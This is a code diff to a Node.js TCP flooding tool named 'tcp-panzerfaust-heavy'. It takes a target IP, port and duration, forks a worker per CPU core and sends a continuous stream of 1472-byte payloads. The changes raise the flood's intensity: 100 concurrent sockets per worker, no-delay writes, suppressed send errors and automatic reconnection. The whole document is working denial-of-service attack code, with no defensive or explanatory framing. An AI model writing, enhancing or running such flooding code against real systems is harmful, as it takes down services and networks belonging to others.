@@ -7,7 +7,7 @@ const port = parseInt(process.argv[3]) || 80;
 const duration = parseInt(process.argv[4]);
 
 if (!target || isNaN(duration)) {
-  console.log('Usage: node tcp-panzerfaust-heavy.js <target_ip> <port> <duration_seconds>');
+  console.log('Usage: node tcp-panzerfaust-heavy-multi.js <target_ip> <port> <duration_seconds>');
   process.exit(1);
 }
 
@@ -15,8 +15,9 @@ const endTime = Date.now() + duration * 1000;
 const payloadSize = 1472;
 const payload = Buffer.alloc(payloadSize);
 const cpuCount = os.cpus().length;
+const socketsPerWorker = 100;
 
-// --- Format Helpers ---
+// Format helpers
 function formatNumber(n) {
   const units = ['', 'K', 'M', 'B', 'T'];
   let i = 0;
@@ -48,6 +49,7 @@ if (cluster.isMaster) {
   console.log(`Duration:              ${duration}s`);
   console.log(`Payload:               ${payloadSize} bytes`);
   console.log(`Cores:                 ${cpuCount}`);
+  console.log(`Sockets/Core:          ${socketsPerWorker}`);
   console.log('Launching...\n');
 
   for (let i = 0; i < cpuCount; i++) cluster.fork();
@@ -84,13 +86,19 @@ if (cluster.isMaster) {
 
   function connectAndFlood() {
     const socket = net.createConnection({ host: target, port: port }, () => {
+      socket.setNoDelay(true);
+
       function sendLoop() {
         if (Date.now() > endTime) return socket.destroy();
 
-        for (let i = 0; i < 50; i++) {
-          socket.write(payload);
-          sent++;
-          bytes += payloadSize;
+        try {
+          for (let i = 0; i < 25; i++) {
+            socket.write(payload);
+            sent++;
+            bytes += payloadSize;
+          }
+        } catch (err) {
+          // Ignore send errors
         }
 
         setImmediate(sendLoop);
@@ -99,13 +107,14 @@ if (cluster.isMaster) {
       sendLoop();
     });
 
-    socket.on('error', () => {
-      setTimeout(connectAndFlood, 100); // reconnect on error
-    });
-
+    socket.on('error', () => setTimeout(connectAndFlood, 100));
     socket.on('close', () => {
       if (Date.now() < endTime) setTimeout(connectAndFlood, 100);
     });
+  }
+
+  for (let i = 0; i < socketsPerWorker; i++) {
+    connectAndFlood();
   }
 
   setInterval(() => {
@@ -113,6 +122,4 @@ if (cluster.isMaster) {
     sent = 0;
     bytes = 0;
   }, 1000);
-
-  connectAndFlood();
 }
